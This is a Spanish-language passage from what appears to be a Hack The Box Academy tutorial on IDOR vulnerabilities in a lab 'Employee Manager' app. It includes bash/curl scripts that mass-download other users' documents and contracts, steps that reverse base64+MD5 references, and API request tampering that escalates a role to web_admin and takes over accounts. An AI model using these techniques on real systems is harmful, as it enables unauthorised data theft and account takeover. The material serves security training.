Es posible que algunas aplicaciones web no utilicen números secuenciales simples como referencias de objetos, pero pueden codificar la referencia o hash en su lugar. Si encontramos tales parámetros utilizando valores codificados o hash, es posible que podamos explotarlos si no hay un sistema de control de acceso en el back-end.

Supongamos que la referencia se codificó con un codificador común (p. ej. `base64`). En ese caso, podríamos decodificarlo y ver el texto sin formato de la referencia del objeto, cambiar su valor y luego codificarlo nuevamente para acceder a otros datos. Por ejemplo, si vemos una referencia como (`?filename=ZmlsZV8xMjMucGRm`), podemos adivinar inmediatamente que el nombre del archivo es `base64` codificado (de su conjunto de caracteres), que podemos decodificar para obtener la referencia de objeto original de (`file_123.pdf`). Entonces, podemos intentar codificar una referencia de objeto diferente (por ejemplo. `file_124.pdf`) e intente acceder a él con la referencia de objeto codificada (`?filename=ZmlsZV8xMjQucGRm`), que puede revelar una vulnerabilidad IDOR si pudimos recuperar cualquier dato.

Por otro lado, la referencia de objeto puede ser hash, como (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). A primera vista, podemos pensar que esta es una referencia de objeto segura, ya que no está utilizando ningún texto claro o codificación fácil. Sin embargo, si miramos el código fuente, podemos ver qué se está procesando antes de realizar la llamada a la API:

Código: javascript

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

En este caso, podemos ver que el código utiliza el `filename` y lo hashing con `CryptoJS.MD5`, lo que nos facilita calcular el `filename` para otros archivos potenciales. De lo contrario, podemos intentar identificar manualmente el algoritmo de hash que se está utilizando (por ejemplo, con herramientas de identificador de hash) y luego hash el nombre del archivo para ver si coincide con el hash utilizado. Una vez que podamos calcular hashes para otros archivos, podemos intentar descargarlos, lo que puede revelar una vulnerabilidad IDOR si podemos descargar cualquier archivo que no nos pertenezca.

---

## Comparar Roles de Usuario

Si queremos realizar ataques IDOR más avanzados, es posible que necesitemos registrar múltiples usuarios y comparar sus solicitudes HTTP y referencias de objetos. Esto puede permitirnos comprender cómo se calculan los parámetros de URL y los identificadores únicos y luego calcularlos para que otros usuarios recopilen sus datos.

Por ejemplo, si tuviéramos acceso a dos usuarios diferentes, uno de los cuales puede ver su salario después de realizar la siguiente llamada API:

Código: json

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

Es posible que el segundo usuario no tenga todos estos parámetros de API para replicar la llamada y no pueda realizar la misma llamada que `User1`. Sin embargo, con estos detalles a mano, podemos intentar repetir la misma llamada API mientras iniciamos sesión como `User2` para ver si la aplicación web devuelve algo. Tales casos pueden funcionar si la aplicación web solo requiere una sesión de inicio de sesión válida para realizar la llamada a la API, pero no tiene control de acceso en el back-end para comparar la sesión de la persona que llama con los datos que se llaman.

Si este es el caso, y podemos calcular los parámetros API para otros usuarios, esto sería una vulnerabilidad IDOR. Incluso si no pudiéramos calcular los parámetros de la API para otros usuarios, todavía habríamos identificado una vulnerabilidad en el sistema de control de acceso de back-end y podríamos comenzar a buscar otras referencias de objetos para explotar.


# Enumeración de IDOR de masa

---

Explotar las vulnerabilidades de IDOR es fácil en algunos casos, pero puede ser muy desafiante en otros. Una vez que identificamos un IDOR potencial, podemos comenzar a probarlo con técnicas básicas para ver si expondría cualquier otro dato. En cuanto a los ataques IDOR avanzados, necesitamos comprender mejor cómo funciona la aplicación web, cómo calcula sus referencias de objetos y cómo funciona su sistema de control de acceso para poder realizar ataques avanzados que pueden no ser explotables con técnicas básicas.

Comencemos a discutir varias técnicas de explotación de vulnerabilidades IDOR, desde la enumeración básica hasta la recopilación masiva de datos, hasta la escalada de privilegios del usuario.

---

## Parámetros Inseguros

Comencemos con un ejemplo básico que muestra una vulnerabilidad IDOR típica. El ejercicio a continuación es un `Employee Manager` aplicación web que aloja registros de empleados:

   

![Gerente de Empleado con el botón 'Editar perfil', enlaces a 'Registros Personales', 'Documentos' y 'Contratos'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

Nuestra aplicación web asume que estamos conectados como empleados con id de usuario `uid=1` para simplificar las cosas. Esto requeriría que iniciáramos sesión con credenciales en una aplicación web real, pero el resto del ataque sería el mismo. Una vez que hacemos clic en `Documents`, somos redirigidos a

`/documents.php`:

   

![Documentos para empleados con enlaces a 'Documentos', 'Factura' e 'Informe'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

Cuando lleguemos al `Documents` página, vemos varios documentos que pertenecen a nuestro usuario. Estos pueden ser archivos cargados por nuestro usuario o archivos establecidos para nosotros por otro departamento (por ejemplo, Departamento de Recursos Humanos). Al verificar los enlaces de archivo, vemos que tienen nombres individuales:

Código: html

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Vemos que los archivos tienen un patrón de nombres predecible, ya que los nombres de los archivos parecen estar utilizando el usuario `uid` y el mes/año como parte del nombre del archivo, lo que puede permitirnos fuzz archivos para otros usuarios. Este es el tipo más básico de vulnerabilidad IDOR y se llama `static file IDOR`. Sin embargo, para fuzz con éxito otros archivos, supondríamos que todos comienzan con `Invoice` o `Report`, que puede revelar algunos archivos, pero no todos. Entonces, busquemos una vulnerabilidad IDOR más sólida.

Vemos que la página está configurando nuestro `uid` con un `GET` parámetro en la URL como (`documents.php?uid=1`). Si la aplicación web utiliza esto `uid` parámetro GET como referencia directa a los registros de empleados que debería mostrar, es posible que podamos ver los documentos de otros empleados simplemente cambiando este valor. Si el extremo de back-end de la aplicación web `does` tener un sistema de control de acceso adecuado, obtendremos alguna forma de `Access Denied`. Sin embargo, dado que la aplicación web pasa como nuestra `uid` en texto claro como referencia directa, esto puede indicar un diseño deficiente de la aplicación web, lo que lleva a un acceso arbitrario a los registros de los empleados.

Cuando intentamos cambiar el `uid` a `?uid=2`, no notamos ninguna diferencia en la salida de la página, ya que todavía estamos recibiendo la misma lista de documentos, y podemos suponer que todavía devuelve nuestros propios documentos:

   

![Documentos para empleados con enlaces a 'Documentos', 'Factura' e 'Informe'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

Sin embargo, `we must be attentive to the page details during any web pentest` y siempre vigile el código fuente y el tamaño de la página. Si miramos los archivos vinculados, o si hacemos clic en ellos para verlos, notaremos que estos son archivos realmente diferentes, que parecen ser los documentos que pertenecen al empleado con `uid=2`:

Código: html

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

Este es un error común que se encuentra en las aplicaciones web que sufren vulnerabilidades IDOR, ya que colocan el parámetro que controla qué documentos de usuario mostrar bajo nuestro control sin tener un sistema de control de acceso en el back-end. Otro ejemplo es usar un parámetro de filtro para mostrar solo los documentos de un usuario específico (por ejemplo. `uid_filter=1`), que también se puede manipular para mostrar los documentos de otros usuarios o incluso eliminarlos por completo para mostrar todos los documentos a la vez.

---

## Enumeración Masiva

Podemos intentar acceder manualmente a otros documentos de empleados con `uid=3`, `uid=4`y así sucesivamente. Sin embargo, acceder manualmente a los archivos no es eficiente en un entorno de trabajo real con cientos o miles de empleados. Entonces, podemos usar una herramienta como `Burp Intruder` o `ZAP Fuzzer` para recuperar todos los archivos o escribir un pequeño script bash para descargar todos los archivos, que es lo que haremos.

Podemos hacer clic en [`CTRL+SHIFT+C`] en Firefox para habilitar el `element inspector`y luego haga clic en cualquiera de los enlaces para ver su código fuente HTML, y obtendremos lo siguiente:

Código: html

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Podemos elegir cualquier palabra única para poder `grep` el enlace del archivo. En nuestro caso, vemos que cada enlace comienza con `<li class='pure-tree_link'>`él puede `curl` la página y `grep` para esta línea, de la siguiente manera:

  Enumeración de IDOR de masa

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Como podemos ver, pudimos capturar los enlaces de documentos con éxito. Ahora podemos usar comandos bash específicos para recortar las partes adicionales y solo obtener los enlaces de documentos en la salida. Sin embargo, es una mejor práctica usar un `Regex` patrón que coincide con las cuerdas entre `/document` y `.pdf`, que podemos usar con `grep` para obtener solo los enlaces del documento, de la siguiente manera:

  Enumeración de IDOR de masa

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Ahora, podemos usar un simple `for` bucle a bucle sobre el `uid` parametrice y devuelva el documento de todos los empleados, y luego use `wget` para descargar cada enlace del documento:

Código: bash

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Cuando ejecutamos el script, descargará todos los documentos de todos los empleados con `uids` entre 1-10, explotando con éxito la vulnerabilidad IDOR para enumerar en masa los documentos de todos los empleados. Este guión es un ejemplo de cómo podemos lograr el mismo objetivo. Intente usar una herramienta como Burp Intruder o ZAP Fuzzer, o escriba otro script de Bash o PowerShell para descargar todos los documentos.


# Evitar Referencias Codificadas

---

En la sección anterior, vimos un ejemplo de un IDOR que usa uids de empleados en texto claro, lo que facilita su enumeración. En algunos casos, las aplicaciones web hacen hashes o codifican sus referencias de objetos, lo que dificulta la enumeración, pero aún puede ser posible.

Volvamos al `Employee Manager` aplicación web para probar el `Contracts` funcionalidad:

   

![Contratos de Empleados con enlaces a 'Contratos' y 'Empleo_contrato.pdf'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)

Si hacemos clic en el `Employment_contract.pdf` archivo, comienza a descargar el archivo. La solicitud interceptada en Burp se ve de la siguiente manera:

![Solicitud HTTP POST a /download.php con el parámetro contract 'cdd96d3cc73d1dbdaffa03c6cd7339b' y encabezados que incluyen Host, Content-Length y User-Agent](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

Vemos que está enviando un `POST` solicitar a `download.php` con los siguientes datos:

Código: php

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Usando a `download.php` el script para descargar archivos es una práctica común para evitar vincular directamente a los archivos, ya que puede ser explotable con múltiples ataques web. En este caso, la aplicación web no está enviando la referencia directa en texto claro, pero parece estar hashing en un `md5` formato. Los hash son funciones unidireccionales, por lo que no podemos decodificarlos para ver sus valores originales.

Podemos intentar hash varios valores, como `uid`, `username`, `filename`y muchos otros, y ver si alguno de sus `md5` los hashes coinciden con el valor anterior. Si encontramos una coincidencia, podemos replicarla para otros usuarios y recopilar sus archivos. Por ejemplo, intentemos comparar el `md5` hash de nuestro `uid`, y ver si coincide con el hash anterior:

  Evitar Referencias Codificadas

```shell-session
vcrdcr@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Desafortunadamente, los hashes no coinciden. Podemos intentar esto con varios otros campos, pero ninguno de ellos coincide con nuestro hash. En casos avanzados, también podemos utilizar `Burp Comparer` y difumina varios valores y luego compara cada uno con nuestro hash para ver si encontramos alguna coincidencia. En este caso, el `md5` hash podría ser para un valor único o una combinación de valores, lo que sería muy difícil de predecir, haciendo de esta referencia directa una `Secure Direct Object Reference`. Sin embargo, hay un defecto fatal en esta aplicación web.

---

## Divulgación de Función

Como la mayoría de las aplicaciones web modernas se desarrollan utilizando marcos de JavaScript, como `Angular`, `React`, o `Vue.js`, muchos desarrolladores web pueden cometer el error de realizar funciones sensibles en el front-end, lo que los expondría a los atacantes. Por ejemplo, si el hash anterior se estaba calculando en el front-end, podemos estudiar la función y luego replicar lo que está haciendo para calcular el mismo hash. Afortunadamente para nosotros, este es precisamente el caso en esta aplicación web.

Si echamos un vistazo al enlace en el código fuente, vemos que está llamando a una función JavaScript con `javascript:downloadContract('1')`. Mirando el `downloadContract()` función en el código fuente, vemos lo siguiente:

Código: javascript

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Esta función parece estar enviando un `POST` solicitud con el `contract` parámetro, que es lo que vimos arriba. El valor que está enviando es un `md5` hash usando el `CryptoJS` biblioteca, que también coincide con la solicitud que vimos anteriormente. Entonces, lo único que queda por ver es qué valor se está acelerando.

En este caso, el valor que se está hashing es `btoa(uid)`, que es el `base64` cadena codificada de la `uid` variable, que es un argumento de entrada para la función. Volviendo al enlace anterior donde se llamó a la función, la vemos llamando `downloadContract('1')`. Entonces, el valor final que se utiliza en el `POST` la solicitud es la `base64` cadena codificada de `1`, que fue entonces `md5` apresurado.

Podemos probar esto por `base64` codificando nuestro `uid=1`y luego lo hashing con `md5`, como sigue:

  Evitar Referencias Codificadas

```shell-session
vcrdcr@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

**Consejo:** Estamos usando el `-n` bandera con `echo`, y el `-w 0` bandera con `base64`, para evitar agregar nuevas líneas, para poder calcular el `md5` hash del mismo valor, sin tener nuevas líneas, ya que eso cambiaría la final `md5` hachís.

Como podemos ver, este hash coincide con el hash en nuestra solicitud, lo que significa que hemos invertido con éxito la técnica de hash utilizada en las referencias de objetos, convirtiéndolas en IDOR. Con eso, podemos comenzar a enumerar los contratos de otros empleados utilizando el mismo método de hash que usamos anteriormente. `Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts`.

---

## Enumeración Masiva

Una vez más, escribamos un simple script bash para recuperar todos los contratos de los empleados. La mayoría de las veces, este es el método más fácil y eficiente para enumerar datos y archivos a través de vulnerabilidades IDOR. En casos más avanzados, podemos utilizar herramientas como `Burp Intruder` o `ZAP Fuzzer`, pero un simple guión de bash debería ser el mejor curso para nuestro ejercicio.

Podemos comenzar calculando el hash para cada uno de los primeros diez empleados usando el mismo comando anterior mientras usamos `tr -d` para eliminar el arrastre `-` caracteres, de la siguiente manera:

  Evitar Referencias Codificadas

```shell-session
vcrdcr@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

A continuación, podemos hacer un `POST` solicitud de `download.php` con cada uno de los hashes anteriores como el `contract` valor, que debería darnos nuestro guión final:

Código: bash

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

Con eso, podemos ejecutar el script, y debe descargar todos los contratos para empleados 1-10:

  Evitar Referencias Codificadas

```shell-session
vcrdcr@htb[/htb]$ bash ./exploit.sh
vcrdcr@htb[/htb]$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

Como podemos ver, debido a que podríamos revertir la técnica de hash utilizada en las referencias de objetos, ahora podemos explotar con éxito la vulnerabilidad IDOR para recuperar los contratos de todos los demás usuarios.



# IDOR en API inseguras

---

Hasta ahora, solo hemos estado utilizando vulnerabilidades IDOR para acceder a archivos y recursos que están fuera del acceso de nuestros usuarios. Sin embargo, las vulnerabilidades de IDOR también pueden existir en las llamadas a funciones y API, y explotarlas nos permitiría realizar varias acciones como otros usuarios.

Mientras `IDOR Information Disclosure Vulnerabilities` permítanos leer varios tipos de recursos, `IDOR Insecure Function Calls` permítanos llamar a API o ejecutar funciones como otro usuario. Dichas funciones y API se pueden usar para cambiar la información privada de otro usuario, restablecer la contraseña de otro usuario o incluso comprar artículos utilizando la información de pago de otro usuario. En muchos casos, podemos estar obteniendo cierta información a través de una vulnerabilidad IDOR de divulgación de información y luego usar esta información con vulnerabilidades de llamada a funciones inseguras de IDOR, como veremos más adelante en el módulo.

---

## Identificación de API inseguras

Volviendo a nuestro `Employee Manager` aplicación web, podemos empezar a probar el `Edit Profile` página para vulnerabilidades IDOR:

   

![Gerente de Empleado con el botón 'Editar perfil', enlaces a 'Registros Personales', 'Documentos' y 'Contratos'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

Cuando hacemos clic en el `Edit Profile` botón, nos llevan a una página para editar información de nuestro perfil de usuario, a saber `Full Name`, `Email`, y `About Me`, que es una característica común en muchas aplicaciones web:

   

![Editar Formulario de perfil con campos para Nombre Completo 'Amy Lindon', Email 'a_lindon@employees.htbl', Acerca de mí 'Una liberación es como un barco. El 80% de los agujeros enchufados no es lo suficientemente bueno.', y botón 'Actualizar perfil'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_edit_profile.jpg)

Podemos cambiar cualquiera de los detalles en nuestro perfil y hacer clic `Update profile`y veremos que se actualizan y persisten a través de actualizaciones, lo que significa que se actualizan en una base de datos en algún lugar. Interceptemos el `Update` solicitar en Burp y míralo:

![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_update_request.jpg)

Vemos que la página está enviando un `PUT` solicitud a la `/profile/api.php/profile/1` punto final API. `PUT` las solicitudes se utilizan generalmente en las API para actualizar los detalles del elemento, mientras `POST` se utiliza para crear nuevos elementos, `DELETE` para eliminar elementos, y `GET` para recuperar detalles del elemento. Entonces, a `PUT` solicitud de la `Update profile` se espera función. El bit interesante son los parámetros JSON que está enviando:

Código: json

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Vemos que el `PUT` la solicitud incluye algunos parámetros ocultos, como `uid`, `uuid`y lo más interesante `role`, que está configurado para `employee`. La aplicación web también parece estar configurando los privilegios de acceso del usuario (por ejemplo. `role`) en el lado del cliente, en la forma de nuestro `Cookie: role=employee` cookie, que parece reflejar el `role` especificado para nuestro usuario. Este es un problema de seguridad común. Los privilegios de control de acceso se envían como parte de la solicitud HTTP del cliente, ya sea como cookie o como parte de la solicitud JSON, dejándola bajo el control del cliente, que podría ser manipulada para obtener más privilegios.

Entonces, a menos que la aplicación web tenga un sistema de control de acceso sólido en el back-end `we should be able to set an arbitrary role for our user, which may grant us more privileges`. Sin embargo, ¿cómo sabríamos qué otros roles existen?

---

## Explotación de API inseguras

Sabemos que podemos cambiar el `full_name`, `email`, y `about` parámetros, ya que estos son los que están bajo nuestro control en el formulario HTML en el `/profile` página web. Entonces, intentemos manipular los otros parámetros.

Hay algunas cosas que podríamos intentar en este caso:

1. Cambia nuestro `uid` a otro usuario `uid`, de modo que podamos hacernos cargo de sus cuentas
2. Cambiar los detalles de otro usuario, lo que puede permitirnos realizar varios ataques web
3. Cree nuevos usuarios con detalles arbitrarios o elimine usuarios existentes
4. Cambiar nuestro rol a un rol más privilegiado (por ejemplo. `admin`) para poder realizar más acciones

Comencemos cambiando nuestro `uid` a otro usuario `uid` (p. ej. `"uid": 2`). Sin embargo, cualquier número que establezcamos aparte del nuestro `uid` nos da una respuesta de `uid mismatch`:

![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK, uid mismatch](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uid_mismatch.jpg)

La aplicación web parece estar comparando las solicitudes `uid` al punto final de la API (`/1`). Esto significa que una forma de control de acceso en el back-end nos impide cambiar arbitrariamente algunos parámetros JSON, lo que podría ser necesario para evitar que la aplicación web se bloquee o devuelva errores.

Quizás podamos intentar cambiar los detalles de otro usuario. Cambiaremos el punto final de la API a `/profile/api.php/profile/2`, y cambiar `"uid": 2` para evitar lo anterior `uid mismatch`:

![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK, uuid mismatch](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uuid_mismatch.jpg)

Como podemos ver, esta vez, recibimos un mensaje de error que dice `uuid mismatch`. La aplicación web parece estar comprobando si el `uuid` el valor que estamos enviando coincide con el del usuario `uuid`. Ya que estamos enviando el nuestro `uuid`, nuestra solicitud está fallando. Esta parece ser otra forma de control de acceso para evitar que los usuarios cambien los detalles de otro usuario.

A continuación, veamos si podemos crear un nuevo usuario con un `POST` solicitud al punto final de la API. Podemos cambiar el método de solicitud a `POST`, cambia el `uid` a un nuevo `uid`y envíe la solicitud al punto final de la API del nuevo `uid`:

![Solicitud HTTP POST a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK, mensaje 'Crear nuevos empleados es solo para administradores'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_1.jpg)

Recibimos un mensaje de error diciendo `Creating new employees is for admins only`. Lo mismo sucede cuando enviamos un `Delete` solicitud, como obtenemos `Deleting employees is for admins only`. La aplicación web podría estar verificando nuestra autorización a través del `role=employee` cookie porque esta parece ser la única forma de autorización en la solicitud HTTP.

Finalmente, intentemos cambiar nuestro `role` a `admin`/`administrator` para obtener privilegios más altos. Desafortunadamente, sin saber un válido `role` nombre, obtenemos `Invalid role` en la respuesta HTTP, y nuestro `role` no actualiza: ![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK, mensaje 'Rol no válido'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_invalid_role.jpg)

Entonces, `all of our attempts appear to have failed`. No podemos crear o eliminar usuarios ya que no podemos cambiar nuestros `role`. No podemos cambiar el nuestro `uid`, como hay medidas preventivas en el back-end que no podemos controlar, ni podemos cambiar los detalles de otro usuario por la misma razón. `So, is the web application secure against IDOR attacks?`.

Hasta ahora, solo hemos estado probando el `IDOR Insecure Function Calls`. Sin embargo, no hemos probado las API `GET` solicitud de `IDOR Information Disclosure Vulnerabilities`. Si no hubiera un sistema de control de acceso robusto, podríamos leer los detalles de otros usuarios, lo que puede ayudarnos con los ataques anteriores que intentamos.

`Try to test the API against IDOR Information Disclosure vulnerabilities by attempting to get other users' details with GET requests`. Si la API es vulnerable, es posible que podamos filtrar los detalles de otros usuarios y luego usar esta información para completar nuestros ataques IDOR en las llamadas a funciones.


# Vulnerabilidades de IDOR encadenamiento

---

Por lo general, a `GET` la solicitud al punto final de la API debe devolver los detalles del usuario solicitado, por lo que podemos intentar llamarla para ver si podemos recuperar los detalles de nuestro usuario. También notamos que después de que la página se carga, obtiene los detalles del usuario con un `GET` solicitud al mismo punto final de API: ![Solicitud HTTP GET a /profile/api.php con encabezados que incluyen Host, User-Agent y Cookie role=empleee](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_api.jpg)

Como se mencionó en la sección anterior, la única forma de autorización en nuestras solicitudes HTTP es la `role=employee` cookie, ya que la solicitud HTTP no contiene ninguna otra forma de autorización específica del usuario, como un token JWT, por ejemplo. Incluso si existiera un token, a menos que un sistema de control de acceso de back-end lo comparara activamente con los detalles del objeto solicitado, es posible que aún podamos recuperar los detalles de otros usuarios.

---

## Divulgación de Información

Enviemos un `GET` solicitud con otro `uid`:

![Solicitud HTTP GET a /profile/api.php con encabezados que incluyen Host, User-Agent y Cookie role=empleee. Respuesta: HTTP/1.1 200 OK con datos JSON incluyendo 'uid', 'uuid', y 'role'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg)

Como podemos ver, esto devolvió los detalles de otro usuario, con los suyos `uuid` y `role`, confirmando un `IDOR Information Disclosure vulnerability`:

Código: json

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

Esto nos proporciona nuevos detalles, sobre todo el `uuid`, que no podíamos calcular antes, y por lo tanto no podíamos cambiar los detalles de otros usuarios.

---

## Modificando los Detalles de Otros Usuarios

Ahora, con el usuario `uuid` a mano, podemos cambiar los detalles de este usuario enviando un `PUT` solicitar a `/profile/api.php/profile/2` con los detalles anteriores junto con cualquier modificación que realicemos, de la siguiente manera:

![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg)

Esta vez no recibimos ningún mensaje de error de control de acceso, y cuando lo intentamos `GET` los detalles del usuario nuevamente, vemos que efectivamente actualizamos sus detalles:

![Solicitud HTTP GET a /profile/api.php con encabezados que incluyen Host, User-Agent y Cookie role=empleee. Respuesta: HTTP/1.1 200 OK con datos JSON incluyendo 'uid', 'uuid', 'role', 'nombre completo', 'email', y 'about'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg)

Además de permitirnos ver detalles potencialmente sensibles, la capacidad de modificar los detalles de otro usuario también nos permite realizar varios otros ataques. Un tipo de ataque es `modifying a user's email address` y luego solicitar un enlace de restablecimiento de contraseña, que se enviará a la dirección de correo electrónico que especificamos, lo que nos permitirá tomar el control de su cuenta. Otro ataque potencial es `placing an XSS payload in the 'about' field`, que se ejecutaría una vez que el usuario visita su `Edit profile` página, lo que nos permite atacar al usuario de diferentes maneras.

---

## Encadenamiento de Dos Vulnerabilidades IDOR

Dado que hemos identificado una vulnerabilidad de Divulgación de Información de IDOR, también podemos enumerar todos los usuarios y buscar otros `roles`, idealmente un rol de administrador. `Try to write a script to enumerate all users, similarly to what we did previously`.

Una vez que enumeremos todos los usuarios, encontraremos un usuario administrador con los siguientes detalles:

Código: json

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

Podemos modificar los detalles del administrador y luego realizar uno de los ataques anteriores para hacerse cargo de su cuenta. Sin embargo, como ahora sabemos el nombre del rol de administrador (`web_admin`), podemos configurarlo para que podamos crear nuevos usuarios o eliminar usuarios actuales. Para hacerlo, interceptaremos la solicitud cuando hagamos clic en el `Update profile` botón y cambiar nuestro rol a `web_admin`:

![Solicitud HTTP PUT a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg)

Esta vez, no obtenemos el `Invalid role` mensaje de error, ni obtenemos ningún mensaje de error de control de acceso, lo que significa que no hay medidas de control de acceso de back-end para los roles que podemos establecer para nuestro usuario. Si nosotros `GET` nuestros detalles del usuario, vemos que nuestro `role` de hecho, se ha establecido que `web_admin`:

Código: json

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Ahora, podemos actualizar la página para actualizar nuestra cookie, o configurarla manualmente como `Cookie: role=web_admin`y luego interceptar el `Update` solicite crear un nuevo usuario y vea si se nos permitiría hacerlo:

![Solicitud HTTP POST a /profile/api.php con datos JSON que incluyen campos 'uid', 'uuid', 'role', 'nombre completo', 'email' y 'about'. Respuesta: HTTP/1.1 200 OK](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)

Esta vez no recibimos un mensaje de error. Si enviamos un `GET` solicitud para el nuevo usuario, vemos que se ha creado con éxito:

![Solicitud HTTP GET a /profile/api.php con encabezados que incluyen Host, User-Agent y Cookie role=web_admin. Respuesta: HTTP/1.1 200 OK con datos JSON incluyendo 'uid', 'uuid', 'role', 'nombre completo', 'email', y 'about'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg)

Combinando la información que obtuvimos del `IDOR Information Disclosure vulnerability` con un `IDOR Insecure Function Calls` ataque a un punto final de API, podríamos modificar los detalles de otros usuarios y crear/eliminar usuarios mientras evitamos varias verificaciones de control de acceso en su lugar. En muchas ocasiones, la información que filtramos a través de las vulnerabilidades de IDOR se puede utilizar en otros ataques, como IDOR o XSS, lo que lleva a ataques más sofisticados o evita los mecanismos de seguridad existentes.

